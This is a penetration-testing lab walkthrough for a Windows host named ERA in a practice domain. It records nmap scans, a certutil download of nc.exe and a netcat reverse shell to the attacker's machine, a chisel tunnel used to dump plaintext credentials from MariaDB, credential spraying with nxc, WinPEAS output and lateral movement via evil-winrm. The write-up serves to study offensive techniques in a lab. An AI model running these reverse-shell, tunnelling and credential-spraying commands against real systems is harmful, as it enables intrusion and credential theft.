aka ERA
## Methodology:
- Discover `mysql` via nmap scan
	- `-sCV` shows our kali isn't allowed to connect
- Use `chisel` on 96 to create a tunnel loop to connect to MariaDB
- Dump db for `Admin` and `charlotte` creds
- Login via `evil-winrm` as `admin` & upgrade shell w/ `nc.exe`
- Search for flags (Will need `-Force` as they're hidden)
- Network Service attack w/ found creds against .97 shows `charlotte` can access SMB on all endpoints
- Run WinPEASE & Mimikatz


## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.96
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3306/tcp  open  mysql
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	7680/tcp  open  pando-pub
	47001/tcp open  winrm
	49664/tcp open  unknown
	49665/tcp open  unknown
	49666/tcp open  unknown
	49667/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49671/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC 192.168.184.96 -p 135,139,445,3306,5040,5985,7680,47001,49664-49671 -oN open_sVsC.txt  
	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql?
	| fingerprint-strings: 
	|   NotesRPC: 
	|_    Host '192.168.45.201' is not allowed to connect to this MariaDB server
	5040/tcp  open  unknown
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	7680/tcp  open  pando-pub?
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port3306-TCP:V=7.94SVN%I=7%D=10/9%Time=6706FF5E%P=x86_64-pc-linux-gnu%r
	SF:(NotesRPC,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.201'\x20is\x20no
	SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 27s
	| smb2-time: 
	|   date: 2024-10-09T22:13:31
	|_  start_date: N/A
	
	NSE: Script Post-scanning.
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 175.37 seconds
```

## Foothold
```bash
# Initial
evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"
```

```powershell
# Upgrading
certutil.exe -urlcache -f http://192.168.45.224:8080/nc.exe

.\nc.exe 192.168.45.224 6666 -e powershell.exe
```

## Tunneling to access MySQL DB
```bash
# Set up tunnel w/ chisel in Kali
./chisel server -p 8000 --reverse
	2024/10/25 15:09:20 server: Reverse tunnelling enabled
	2024/10/25 15:09:20 server: Fingerprint ER8rRFL8yr1lmK1BBUWTlsON3MBMVTGczmoO1J0L6pc=
	2024/10/25 15:09:20 server: Listening on http://0.0.0.0:8000
	2024/10/25 15:15:05 server: session#1: tun: proxy#R:3306=>3306: Listening
```

```powershell
# In shell_96
.\chisel.exe client 192.168.45.224:8000 R:3306:127.0.0.1:3306
	chisel.exe : 2024/10/25 19:15:36 client: Connecting to ws://192.168.45.224:8000
	    + CategoryInfo          : NotSpecified: (2024/10/25 19:1...168.45.224:8000:String) [], RemoteException
	    + FullyQualifiedErrorId : NativeCommandError
	2024/10/25 19:15:36 client: Connected (Latency 62.6283ms)
```
	- NOTE:  Using a tunnel on 96 itself.   No need to attempt to tunnel through 95 - will NOT work

```bash
# Access mysql db
mysql -u root -h 127.0.0.1 --skip-ssl               
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MariaDB connection id is 8
	Server version: 10.4.19-MariaDB mariadb.org binary distribution
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Support MariaDB developers by giving a star at https://github.com/MariaDB/server
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MariaDB [(none)]> show databases;
		+--------------------+
		| Database           |
		+--------------------+
		| creds              |
		| information_schema |
		| mysql              |
		| performance_schema |
		| phpmyadmin         |
		| test               |
		+--------------------+
		
	MariaDB [(none)]> show tables from creds;
		+-----------------+
		| Tables_in_creds |
		+-----------------+
		| creds           |
		+-----------------+
		
	MariaDB [(none)]> use creds;
		Reading table information for completion of table and column names
		You can turn off this feature to get a quicker startup with -A
		
		Database changed
	MariaDB [creds]> select * from creds;
		+---------------+-----------------+
		| name          | pass            |
		+---------------+-----------------+
		| administrator | Almost4There8.? |
		| charlotte     | Game2On4.!      |
		+---------------+-----------------+

```

## evil-WinRM as Admin
```powershell
evil-winrm -i 192.168.224.96 -u administrator -p "Almost4There8.?"
	...
	*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\users -Include proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue -Force
		    Directory: C:\users\Administrator\Desktop
		
		
		Mode                 LastWriteTime         Length Name
		----                 -------------         ------ ----
		-a----        10/25/2024   6:58 PM             34 proof.txt
		
		
		    Directory: C:\users\apache\Desktop
		
		
		Mode                 LastWriteTime         Length Name
		----                 -------------         ------ ----
		-a----        10/25/2024   6:58 PM             34 local.txt
	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\administrator\desktop\proof.txt -force
		e2587c78dce7bac15681d482ebec9a19
	*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\users\apache\desktop\local.txt -force
		8ec436f8a9df6984f440e9066ed80b08
```

## Network Services
```bash
nxc smb 192.168.224.95-97 -u charlotte -p Game2On4.! -d secura.yzx             
	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
	SMB         192.168.224.95  445    SECURE           [*] Windows 10 / Server 2019 Build 19041 x64 (name:SECURE) (domain:secura.yzx) (signing:False) (SMBv1:False)
	SMB         192.168.224.96  445    ERA              [*] Windows 10 / Server 2019 Build 19041 x64 (name:ERA) (domain:secura.yzx) (signing:False) (SMBv1:False)
	SMB         192.168.224.97  445    DC01             [+] secura.yzx\charlotte:Game2On4.! 
	SMB         192.168.224.95  445    SECURE           [+] secura.yzx\charlotte:Game2On4.! 
	SMB         192.168.224.96  445    ERA              [+] secura.yzx\charlotte:Game2On4.! 
	Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

nxc ldap 192.168.224.97 -u users.txt -p pws.txt -d secura.yzx
	SMB         192.168.224.97  445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:secura.yzx) (signing:True) (SMBv1:True)
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:New2Era4.! 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\charlotte:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\michael:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\administrator:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [-] secura.yzx\apache:Reality2Show4!.? 
	LDAP        192.168.224.97  389    DC01             [+] secura.yzx\charlotte:Game2On4.!
```

## WinPEAS

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
    Name                                   Microsoft.PowerShell
      BUILTIN\Administrators               AccessAllowed
      NT AUTHORITY\INTERACTIVE             AccessAllowed
      BUILTIN\Remote Management Users      AccessAllowed
   =================================================================================================

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-

    Apache Server(Apache Software Foundation - Apache Server)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
    File Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Authenticated Users [WriteData/CreateFiles])
    Apache/2.4.48 (Win64)
...
   =================================================================================================

    MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected
    File Permissions: Authenticated Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [WriteData/CreateFiles])
   =================================================================================================
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Apache-Nginx Files
File: C:\xampp\php\php.ini
...
ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP Sessions Files
File: C:\xampp\tmp\sess_slj10ssu5745kcivardthqb5rg
File: C:\xampp\tmp\sess_4ratl05q4mpc92ib7bga2imgr9

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found PHP_files Files
File: C:\xampp\phpMyAdmin\setup\config.php                                                                            # NOTE
...
File: C:\xampp\phpMyAdmin\vendor\symfony\config\ConfigCache.php
...
File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\PassConfig.php                                 # NOTE
File: C:\xampp\phpMyAdmin\vendor\symfony\dependency-injection\Compiler\MergeExtensionConfigurationPass.php
File: C:\xampp\phpMyAdmin\config.inc.php                                                                              # NOTE
...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Moodle Files
File: C:\xampp\phpMyAdmin\libraries\classes\Config.php
File: C:\xampp\phpMyAdmin\setup\config.php
File: C:\xampp\php\pear\PEAR\Command\Config.php
File: C:\xampp\php\pear\PEAR\Config.php

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found Tomcat Files
File: C:\xampp\tomcat\conf\tomcat-users.xml
```


## Laterally Move to 97
```bash
evil-winrm -i 192.168.224.97 -u charlotte -p "Game2On4.\!"                          
	Evil-WinRM shell v3.5
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\TEMP\Documents> 
```